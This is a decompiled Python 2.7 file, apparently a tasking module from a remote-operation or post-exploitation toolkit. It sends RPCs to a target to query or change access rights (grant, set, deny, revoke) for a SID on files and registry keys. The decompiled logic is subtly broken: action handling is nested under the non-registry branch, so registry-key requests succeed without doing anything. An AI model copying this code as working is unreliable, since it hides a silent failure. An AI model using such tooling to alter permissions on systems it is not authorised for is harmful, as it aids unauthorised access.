# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Permissions_Tasking.py
ACTION_QUERY = 1
ACTION_ADD = 2
MODE_GRANT = 1
MODE_SET = 2
MODE_DENY = 3
MODE_REVOKE = 4

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.virtualdir
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.permissions', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.permissions.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['object'] == None or len(lpParams['object']) == 0:
        mcl.tasking.EchoError('A name must be specified')
        return False
    else:
        name = lpParams['object']
        if lpParams['type'] == mca.security.cmd.permissions.TYPE_REG_KEY:
            if lpParams['extra'] != None and len(lpParams['extra']) > 0:
                fullKey = '%s\\%s' % (name, lpParams['extra'])
                name = fullKey
        else:
            if lpParams['type'] == mca.security.cmd.permissions.TYPE_FILE:
                try:
                    fullName = mcl.tasking.virtualdir.GetFullPath(name)
                    name = fullName
                except:
                    mcl.tasking.EchoError('Failed to apply virtual path')
                    return False

            if lpParams['action'] == ACTION_QUERY:
                qParams = mca.security.cmd.permissions.QueryParams()
                qParams.type = lpParams['type']
                qParams.objectType = lpParams['objectType']
                qParams.name = name
                rpc = mca.security.cmd.permissions.tasking.RPC_INFO_QUERY
                msg = MarshalMessage()
                qParams.Marshal(msg)
                rpc.SetData(msg.Serialize())
            elif lpParams['action'] == ACTION_ADD:
                if lpParams['sid'] == None or len(lpParams['sid']) == 0:
                    mcl.tasking.EchoError('A SID must be specified')
                    return False
                mParams = mca.security.cmd.permissions.ModifyParams()
                mParams.type = lpParams['type']
                mParams.objectType = lpParams['objectType']
                mParams.name = name
                mParams.sid = lpParams['sid']
                mParams.accessMask = lpParams['access']
                if lpParams['permanent']:
                    mParams.flags |= mca.security.cmd.permissions.PARAMS_SET_FLAG_PERMANENT
                if lpParams['mode'] == MODE_GRANT:
                    mParams.flags |= mca.security.cmd.permissions.PARAMS_SET_FLAG_GRANT
                elif lpParams['mode'] == MODE_SET:
                    mParams.flags |= mca.security.cmd.permissions.PARAMS_SET_FLAG_SET
                elif lpParams['mode'] == MODE_DENY:
                    mParams.flags |= mca.security.cmd.permissions.PARAMS_SET_FLAG_DENY
                elif lpParams['mode'] == MODE_REVOKE:
                    mParams.flags |= mca.security.cmd.permissions.PARAMS_SET_FLAG_REVOKE
                else:
                    mcl.tasking.EchoError('Invalid mode')
                    return False
                rpc = mca.security.cmd.permissions.tasking.RPC_INFO_MODIFY
                msg = MarshalMessage()
                mParams.Marshal(msg)
                rpc.SetData(msg.Serialize())
                rpc.SetMessagingType('message')
            else:
                mcl.tasking.EchoError('Invalid action')
                return False
            rpc.SetMessagingType('message')
            res = mcl.tasking.RpcPerformCall(rpc)
            if res != mcl.target.CALL_SUCCEEDED:
                mcl.tasking.RecordModuleError(res, 0, mca.security.cmd.permissions.errorStrings)
                return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)